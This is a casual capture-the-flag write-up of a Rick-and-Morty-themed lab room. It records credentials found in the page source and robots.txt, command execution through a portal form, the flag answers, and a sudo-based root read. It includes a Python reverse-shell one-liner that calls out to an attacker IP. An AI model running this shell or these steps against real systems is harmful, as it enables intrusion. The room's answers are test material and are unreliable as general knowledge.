sunday	-	13 june 2021


ip:	`10.10.140.229`

*	found from source code, username: `R1ckRul3s`

*	found from /robots.txt,  `Wubbalubbadubdub`	(basically password)

>	`/assets` has some extra file/imgs/gifs so there should be more webpages. 
>	one file's name was 'portal.png' so there must be a portal. look for portal. 
>	got **portal.php**.


*	above were credentials to login to `/portal.php`.

### portal.php

found a form, which takes command and executes it.

```sh
$ cd ..
$ ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

1.	first ingredient:	`mr. meeseek hair`
	*	found at `10.10.140.229/Sup3rS3cretPickl3Ingred.txt`

*	`/clue.txt` says 'Look around the file system for the other ingredient.', means second ingredient can also be found thru command form (maybe)

*	by looking at the source code of `/portal.php`, there was this excrypted string: 
	```
	Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
	```

	*	so i tried to decode it, using **base64 online decrypter** (https://www.base64decode.org/), 
	*	it was encrypted several times so atfer decrypting, i found that it was a rabbit-hole. 
	*	NOOO i mean seriously it was `rabbit hole` 😆 



2.	get a reverse shell, to access the machine, therefore, one-liner reverse shell:
	```sh
	$	python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.102.216",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	```

	*	i was trying to open a reverse shell, but it didnt worked for me. 

	*	so after reading another write-up. i found that we can move within directories in one command and check if flag's in it using another command!

		```sh
		$	ls /home/rick
		```

		*	here's our second ingredient, but we can see it right! coz `cat` command is blocked. Well there's another command called `less` which seem to work just like `cat`.

	*	hense, second ingredient is `1 jerry tear`


3.	now for third ingredient, we must need a `sudo` powers coz it must be related to **root** user and shit!

	*	after checking current user perms, it seems like we can use `sudo` with any command **without** password. Hell yeahHHhhh 🔥 But certainly bad security decision!

	*	Let's check `/root` folder's content.

	*	there's some file called `3rd.txt` that must be it :)

	*	Therefore, third ingredient is `fleeb juice`

##	Hense, room complete!

>	ps:	man it took me three whole days of procarsinating to complete this room! and still i didn't use reverse shell :(






